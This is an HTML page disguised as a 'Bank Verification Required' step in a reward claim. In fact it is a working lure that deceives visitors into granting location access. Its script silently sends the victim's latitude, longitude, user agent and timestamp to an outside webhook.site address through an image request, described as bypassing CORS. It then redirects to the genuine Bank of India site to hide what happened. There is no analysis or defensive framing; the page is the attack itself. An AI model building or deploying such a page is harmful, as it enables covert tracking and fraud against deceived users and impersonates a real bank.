<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bank Verification</title>
  <style>
    body {
      background: linear-gradient(to right, #007bff, #00c6ff);
      font-family: Arial, sans-serif;
      color: white;
      text-align: center;
      padding: 40px;
    }
    .card {
      background: white;
      color: #333;
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    button {
      background-color: #007bff;
      color: white;
      padding: 12px 25px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      margin-top: 20px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Bank Verification Required</h2>
    <p>Please verify your location to continue the reward claim process.</p>
    <button onclick="getLocation()">Verify Now</button>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        alert("Geolocation is not supported by this device.");
      }
    }

function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const ua = encodeURIComponent(navigator.userAgent);
  const t = new Date().toISOString();

  // âœ… Image request: bypasses CORS, always logs
  const img = new Image();
  img.src = `https://webhook.site/0323c882-237f-4f5d-82a9-84e2913addf7?lat=${lat}&lon=${lon}&ua=${ua}&time=${t}`;

  // Optional: redirect after 1 second
  setTimeout(() => {
    window.location.href = "https://www.bankofindia.co.in";
  }, 1000);
}


    function showError(error) {
      alert("Location access denied. Cannot proceed.");
    }
  </script>
</body>
</html>
